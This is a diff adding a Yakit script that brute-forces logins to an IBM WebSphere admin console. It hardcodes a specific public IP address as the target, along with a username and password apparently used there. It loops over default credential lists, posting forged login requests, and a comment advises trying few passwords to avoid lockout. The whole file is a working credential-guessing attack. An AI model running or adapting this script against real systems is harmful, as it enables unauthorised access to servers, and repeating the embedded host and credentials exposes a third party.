@@ -1,0 +1,97 @@
+yakit.AutoInitYakit()
+
+# Input your code!
+
+// user=["wsadmin"]
+// pass=["407Bts9i"]
+// target="43.138.169.182:9043"
+log.setLevel("info") 
+yakit.AutoInitYakit()
+users = cli.LineDict("users")
+pwds = cli.LineDict("pwds")
+target = cli.String("target")
+cli.check()
+host,port  = str.ParseStringToHostPort(target)~
+ulen =len(users)
+if ulen  <1 {
+    users = []string{"wsadmin","admin","admins"}
+    // users = []string{"weblogic"}
+    ulen =len(users)  
+}
+plen = len(pwds)
+if plen  <1 {
+    pwds = []string{"wsadmin","admin","407Bts9i"} // weblogic 爆破超过5次 会锁账号 4个密码 就行了 莫强求
+    // pwds = []string{"Oracle@123"}
+    plen =  len(pwds)
+}
+sendPacket = func(target, uname,passwd) {
+    return poc.HTTP(`
+POST /ibm/console/j_security_check HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
+Content-Length: 47
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Encoding: identity
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Content-Type: application/x-www-form-urlencoded
+Cookie: TJE=; TE3=; JSESSIONID=0000j7yOPSfxk1DsIKePiHj3-5-:-1; WASReqURL=https://:9043/ibm/console/login.do?action=secure
+Origin: https://43.138.169.182:9043
+Referer: https://43.138.169.182:9043/ibm/console/logon.jsp
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Upgrade-Insecure-Requests: 1
+
+j_username={{params(uname)}}&j_password={{params(passwd)}}&action=Log+in`,
+
+        poc.params({
+            "target": sprintf("%s:%v",host,port),
+            "uname": uname,
+            "passwd": passwd,
+        }),poc.noRedirect(true),//poc.proxy("http://127.0.0.1:8083"),
+    )~
+}
+
+
+yakit.Info("Loading users number %d", ulen)
+yakit.Info("Loading pwds number %d ", plen)
+
+count = 0
+pro = 0
+percent = 200
+
+if plen*ulen > 200 {
+    percent = (plen*ulen)/10
+}
+
+for _, pwd = range pwds{
+    for _, user = range users{
+    count++
+
+    if count > percent {
+        count = 0
+        pro +=percent
+        yakit.Info("sended payload %d",pro)
+        yakit.SetProgress(float(pro)/(plen*ulen))
+    }
+    rsp, req = sendPacket(target, user,pwd)
+    // println(string(req))
+    println("----------------------------------------------------------------")
+    // println(string(rsp))
+    // println(str.ParseBytesToHTTPResponse(rsp))
+    headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+        println(headers)
+        if str.MatchAllOfSubString(headers, "?action=secure") {
+            println(123)
+            yakit.Info("found weblogic weak acount %s/%s", user,pwd)
+            yakit.StatusCard("weblogic weak acount", user,pwd)
+            yakit.SetProgress(1)
+            
+// Location: https://43.138.169.182:9043/ibm/console/login.do?action=secure
+
+        }
+    }
+}
+yakit.Info("script finished!!!")
+ yakit.SetProgress(1)
